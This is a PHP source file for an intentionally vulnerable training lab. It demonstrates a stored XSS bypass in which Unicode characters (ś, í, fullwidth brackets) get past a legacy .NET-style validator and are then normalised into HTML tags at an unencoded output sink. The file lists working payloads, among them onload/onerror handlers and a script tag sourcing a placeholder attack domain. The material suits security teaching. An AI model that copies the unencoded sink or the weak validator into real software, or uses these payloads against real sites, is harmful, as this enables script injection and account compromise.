<?php
declare(strict_types=1);

/**
 * Intentionally vulnerable demo:
 * - Legacy-ish input validation that blocks '<' unless:
 *    1) it's followed by '%' (allows <%...>)
 *    2) it's followed by a non-ASCII byte (simulates "tag name begins with a special character")
 * - Deterministic, lossy "DB" transform:
 *    Keep ASCII as-is.
 *    Map ONLY:  ＜ → <,  ＞ → >,  ś → s,  í → i
 *    All other non-ASCII → '?'
 * - Output is intentionally NOT encoded to demonstrate the sink.
 */

function legacy_dotnetish_validation(string $s): bool {
    $len = strlen($s); // byte-wise on purpose

    for ($i = 0; $i < $len; $i++) {
        if ($s[$i] !== '<') {
            continue;
        }

        $next = ($i + 1 < $len) ? $s[$i + 1] : '';

        // block literal closing tags like </script>
        if ($next === '/') {
            return false;
        }

        // allow legacy/server-delimiter style <%...>
        if ($next === '%') {
            continue;
        }

        // optional: keep this quirk if you want "< anything" to pass
        if ($next === ' ') {
            continue;
        }

        // allow "<" followed by a non-ASCII byte
        // examples: <ścript>, <ímg>, <śvg>
        if ($next !== '' && (ord($next) & 0x80) === 0x80) {
            continue;
        }

        // reject normal HTML tag starts like <script>, <svg>, <img>, <a>, etc.
        return false;
    }

    return true;
}

function db_deterministic_store_transform(string $s): string {
    $map = [
        "＜" => "<",  // FULLWIDTH LESS-THAN (U+FF1C)
        "＞" => ">",  // FULLWIDTH GREATER-THAN (U+FF1E)
        "ś" => "s",  // (U+015B)
        "í" => "i",  // (U+00ED)
    ];

    $out = '';
    $chars = preg_split('//u', $s, -1, PREG_SPLIT_NO_EMPTY);
    if ($chars === false) {
        // Invalid UTF-8: return a safe-ish placeholder representation
        return str_repeat('?', strlen($s));
    }

    foreach ($chars as $ch) {
        // ASCII pass-through
        if (strlen($ch) === 1 && ord($ch) < 0x80) {
            $out .= $ch;
            continue;
        }
        $out .= $map[$ch] ?? '?';
    }

    return $out;
}

function h(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$raw_input = '';
$stored_value = '';
$error = '';
$ok = false;

$storage_file = __DIR__ . '/stored.txt';
if (is_file($storage_file)) {
    $stored_value = file_get_contents($storage_file) ?: '';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_input = isset($_POST['user_text']) ? (string)$_POST['user_text'] : '';

    if (!legacy_dotnetish_validation($raw_input)) {
        $error = "Rejected by legacy request validation";
    } else {
        $stored_value = db_deterministic_store_transform($raw_input);
        file_put_contents($storage_file, $stored_value);
        $ok = true;
    }
}


$payload_templates = [
    [
        'title' => 'Try inserting any random string',
        'note'  => "\nInsert the following string and click apply\n\nObserve the structural syntax your input is reflected",
        'text'  => "d34db33f",
    ],
    [
        'title' => 'Try inserting a basic HTML tag',
        'note'  => "\nObserve it's rejected by input validation",
        'text'  => "<script>",
    ],
	    [
        'title' => 'Try inserting the same tag but with a special character (%) following the opening bracket',
        'note'  => "\nObserve that input validation allows it, but that it isn't rendered as HTML",
        'text'  => "<%script>",
    ],
    [
        'title' => 'Try inserting a script tag with a unicode diacritic (ś) following the opening bracket',
        'note'  => "\nObserve that input validation allows it and renders it as html. \n\nYou will need to input a normal string to return the lab to usable condition",
        'text'  => "<ścript>",
    ],
	    [
        'title' => 'Try inserting a full Proof of Concept payload',
        'note'  => "\nObserve that input validation doesn't allow it.\n\nWhy?\n\n",
        'text'  => "<ścript>alert(1)</ścript>",
    ],
		    [
        'title' => 'Try removing the closing tag',
        'note'  => "\nObserve that it was causing the block\n\nA tag that doesn't require closing will be needed",
        'text'  => "<ścript>alert(1)",
    ],
	    [
        'title' => 'Try an SVG tag using ś diacritic',
        'note'  => "\nRelies on ś → s during storage to form a standard svg tag",
        'text'  => "<śvg onload=alert(1)>",
    ],
	    [
        'title' => ' Try an image tag using í diacritic',
        'note'  => "\nRelies on í → i during storage to form a standard image tag",
        'text'  => "<ímg src=x onerror=alert(1)>",
    ],
    [
        'title' => 'A script tag can be used',
        'note'  => "\nRequires an event handler or an external src",
        'text'  => "<ścript src=\"http://attack-domain\">",
    ],
    [
        'title' => 'Fullwidth brackets allow opening and closing script tag',
        'note'  => "\nUses FULLWIDTH ＜ ＞ which become ASCII < > during storage\n\nInsert the following payload and click apply",
        'text'  => "＜script＞alert(1)＜/script＞",
    ],
];
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Legacy Validation + Lossy DB Demo</title>
  <link rel="stylesheet" href="/shared/css/theme.css">
  <link rel="stylesheet" href="/shared/css/header.css">

</head>

<body>
 <div class="page-wrap">

  <a href="/" class="ctb-home">
    <div class="ctb-header headerpanel" role="banner">
      <div class="ctb-inner">
        <img class="ctb-shield" src="/shared/images/shield.png" alt="" aria-hidden="true" />
        <div class="ctb-text">
          <div class="ctb-title">
            <div class="crevice">CREVICE</div>
            <div class="testbed">TESTBED</div>
          </div>
        </div>
        <div class="ctb-tag">Exploit WebApp Vulnerabilities</div>
      </div>
    </div>
  </a>

  <div class="layout-row">

    <!-- Main vulnerable app -->
    <div class="app-container panel">
      <div class="header-row">
        <h2>Legacy Validation + Best-Fit Fallback Demo</h2>
      </div>

      <div class="input-panel">

     <div class="row">
          <label for="user_text">User input</label>
		  </div>
        <form id="mainForm" method="post">
          <textarea id="user_text" name="user_text" placeholder="Enter text here..."><?php
            // INTENTIONALLY NOT ENCODED 
            echo h($raw_input);
          ?></textarea>
        </form>
        <div class="row">
          <button form="mainForm" type="submit">Apply</button>
        </div>
        <div class="status">
		<br>
          Validation:
          <span class="badge <?php echo $error ? 'err' : ($ok ? 'ok' : ''); ?>">
            <?php echo $error ? 'rejected' : ($ok ? 'accepted' : 'idle'); ?>
          </span>
        </div>

        <?php if ($error): ?>
          <pre><?php echo h($error); ?></pre>
        <?php endif; ?>


        <div class="section">
          <h3 class="whitetext">Debug</h3>
          <pre><?php
            echo "RAW INPUT:\n" . h($raw_input) . "\nStored as (vulnerable sink): " . $stored_value;
          ?></pre>
        </div>
      </div>
    </div>

      <!-- EXAMPLE PAYLOADS -->
 <div class="payloads-container panel">

  <div class="header-row">
    <h2>Example Payloads</h2>
    <button type="button" id="toggleAllPayloads">Show all</button>
  </div>

  <div class="input-panel" style="margin-bottom:0;">

    <?php foreach ($payload_templates as $idx => $p): ?>

      <div class="payload-block">

        <div class="payload-body" id="payload-<?= $idx ?>">

          <p class="note">
            <strong><?= h($p['title']) ?>:</strong>
            <?= nl2br(h($p['note'])) ?>
          </p>

          <pre><?= h($p['text']) ?></pre>

        </div>

      </div>

    <?php endforeach; ?>

  </div>
</div>


<div class="text-container">
<div class="input-panel textborder">
	  Demonstration where character transformations of Unicode characters allow bypass of legacy .NET style input validation leading to stored XSS due to unencoded output sink.
	  <br><br>
	  Ref:
	  <br>
	  <a href="https://en.wikipedia.org/wiki/I">Diacritics of I</a>
	  <br>
	  <a href="https://en.wikipedia.org/wiki/S">Diacritics of S</a>
	   <br>
	  <a href="https://www.compart.com/en/unicode/U+FF1C">Fullwidth Less-Than Sign</a>
	   <br>
	  <a href="https://www.compart.com/en/unicode/U+FF1E">Fullwidth Greater-Than Sign</a>
    </div>
	</div>

  </div>
  <br>
  <a class="whitetext" href="/">Home</a></div>

 <script src="/shared/scripts/payloadsButton.js"></script>
</body>
</html>

